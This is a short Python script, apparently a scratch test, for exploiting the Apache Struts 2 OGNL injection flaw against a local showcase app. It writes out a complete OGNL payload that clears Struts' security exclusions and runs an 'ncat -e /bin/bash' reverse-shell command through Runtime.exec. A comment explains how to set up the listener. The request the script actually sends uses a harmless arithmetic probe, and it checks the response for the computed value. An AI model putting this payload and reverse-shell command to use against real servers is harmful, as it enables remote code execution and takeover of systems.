# This is a scratch file for ant to test some code

# Exploiting the Apache Struts 2 vulnerability

import requests
import sh

def confirm_exploit(resp, test_value):
    '''searches response for evidence the exploitive calculation was done.'''
    resp_text = resp.text
    lines = resp_text.split('\n')
    for line in lines:
        if '42' in line:
            print('Found computed value in response: \n {}'.format(line))
            print('BUG VERIFIED')
            return

    print('BUG PATCHED')


def exploit():
    '''This function goes exploits the apache struts2 vulnerability'''
    url = 'http://localhost:8080/struts2-showcase/integration/saveGangster.action'

    # Note that in order for this to work need to run
    #  ncat -v -l -p 4444
    exploitive_command = "ncat -e /bin/bash 127.0.0.1 4444"
    malicious_name = "%{"
    malicious_name += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
    malicious_name += "(#_memberAccess?(#_memberAccess=#dm):"
    malicious_name += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
    malicious_name += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
    malicious_name += "(#ognlUtil.getExcludedPackageNames().clear())."
    malicious_name += "(#ognlUtil.getExcludedClasses().clear())."
    malicious_name += "(#context.setMemberAccess(#dm))))."
    malicious_name += "(@java.lang.Runtime@getRuntime().exec('{}'))".format(exploitive_command)
    malicious_name += "}"

    less_malicious_name = "${4*10+2}"

    payload = {
        "name": less_malicious_name,
        "age": 20,
        "__checkbox_bustedBefore": "true",
        "description": 1
    }

    resp = requests.post(url, data=payload)
    print('Payload causes remote code execution')
    print('Server computing the meaning of the universe 4*10+2')
    print('verifying...')
    confirm_exploit(resp,42)

if __name__ == '__main__':
    '''Doing the exploit'''
    exploit()
